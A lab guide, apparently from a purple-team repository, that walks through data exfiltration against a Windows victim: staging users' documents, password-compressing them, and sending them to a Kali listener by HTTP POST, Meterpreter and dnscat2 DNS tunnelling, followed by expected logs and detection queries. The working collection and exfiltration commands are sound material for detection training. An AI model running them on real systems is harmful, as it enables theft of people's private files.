# 05 - Data Exfiltration (T1048)

## Description

Data exfiltration is the unauthorized transfer of data from the victim environment to an attacker-controlled destination. Attackers typically compress and encrypt data before exfiltration to evade DLP controls and content inspection.

**MITRE ATT&CK:** [T1048 - Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048/)

## Sub-techniques Covered

- T1048.003 — Exfiltration over HTTP/HTTPS
- T1041 — Exfiltration over C2 channel
- T1567 — Exfiltration to cloud storage
- T1560 — Archive collected data

## Prerequisites

- Active shell on the Windows victim
- Outbound internet access (via pfSense NAT)
- Attacker-controlled HTTP listener on Kali

## Steps to Reproduce

### Step 1: Collect and Stage Data

On the Windows victim, gather sensitive files:

```powershell
# Find interesting files
Get-ChildItem -Path C:\Users -Recurse -Include *.docx,*.xlsx,*.pdf,*.txt -ErrorAction SilentlyContinue |
    Where-Object { $_.Length -gt 0 } |
    Select-Object FullName, Length, LastWriteTime

# Collect into a staging directory
mkdir C:\Windows\Temp\exfil
copy C:\Users\*\Documents\*.docx C:\Windows\Temp\exfil\
copy C:\Users\*\Desktop\*.txt C:\Windows\Temp\exfil\
```

### Step 2: Compress and Optionally Encrypt

```powershell
# Compress with PowerShell
Compress-Archive -Path C:\Windows\Temp\exfil\* -DestinationPath C:\Windows\Temp\data.zip

# Or use 7-Zip with password (encryption)
7z a -p"s3cur3passw0rd" C:\Windows\Temp\data.7z C:\Windows\Temp\exfil\*
```

### Step 3A: Exfiltrate over HTTP (POST)

On Kali, start a receiving HTTP server:

```bash
# Use Python to receive file upload
python3 -c "
import http.server, cgi

class Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        ctype, pdict = cgi.parse_header(self.headers['content-type'])
        if 'boundary' in pdict:
            pdict['boundary'] = bytes(pdict['boundary'], 'utf-8')
        fs = cgi.FieldStorage(fp=self.rfile, headers=self.headers,
            environ={'REQUEST_METHOD':'POST','CONTENT_TYPE':self.headers['content-type']})
        for f in fs.list or []:
            open(f'/tmp/{f.filename}', 'wb').write(f.file.read())
        self.send_response(200)
        self.end_headers()

http.server.HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
"
```

On Windows victim:

```powershell
# Upload via Invoke-WebRequest
$file = 'C:\Windows\Temp\data.zip'
Invoke-WebRequest -Uri "http://192.168.10.10:8080/upload" -Method POST -InFile $file
```

### Step 3B: Exfiltrate via Meterpreter

From an active Meterpreter session:

```
meterpreter > download C:\Windows\Temp\data.zip /tmp/exfil/
```

### Step 3C: DNS Exfiltration (Covert)

Encode data in DNS queries to evade firewall rules:

```bash
# On Kali: start a DNS listener (dnscat2)
dnscat2-server attacker.lab

# On Windows victim: send data
dnscat2.exe --dns host=192.168.10.10,port=53 --secret=<secret>
```

## Expected Network Traffic

- Large HTTP POST from victim to attacker IP
- Unusual outbound data volume (spikes in bytes transferred)
- DNS queries with unusually long subdomains (DNS exfil)
- Connections to cloud storage APIs (if exfil to cloud)

## Expected Log Entries

### Zeek conn.log — Large Data Transfer

```
ts: 1704067200.0
id.orig_h: 192.168.20.30
id.resp_h: 192.168.10.10
id.resp_p: 8080
proto: tcp
orig_bytes: 52428800   # 50 MB outbound
resp_bytes: 200
```

### Sysmon Event ID 3 — Network Connection

```xml
EventID: 3
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
DestinationIp: 192.168.10.10
DestinationPort: 8080
Initiated: true
```

### Suricata Alert — Large Outbound Transfer

```
alert tcp $HOME_NET any -> $EXTERNAL_NET any (
    msg:"Large outbound data transfer";
    threshold: type both, track by_src, count 1, seconds 60;
    dsize:>1000000;
    sid:9000010;
)
```

## Detection Opportunities

| Indicator | Log Source | Query |
|-----------|-----------|-------|
| Large outbound data volume | Zeek conn.log | `orig_bytes > 10000000 AND id.orig_h IN $internal_nets` |
| PowerShell making outbound connections | Sysmon Event 3 | `EventID=3 Image=*powershell.exe Initiated=true` |
| Compressed archive created in temp | Sysmon Event 11 | `EventID=11 TargetFilename=*\Temp\*.zip` |
| DNS queries with long subdomains | Zeek dns.log | `query_len > 50` |

See [../../detections/suricata-rules/README.md](../../detections/suricata-rules/README.md) and [../../detections/zeek-scripts/README.md](../../detections/zeek-scripts/README.md) for detection rules.
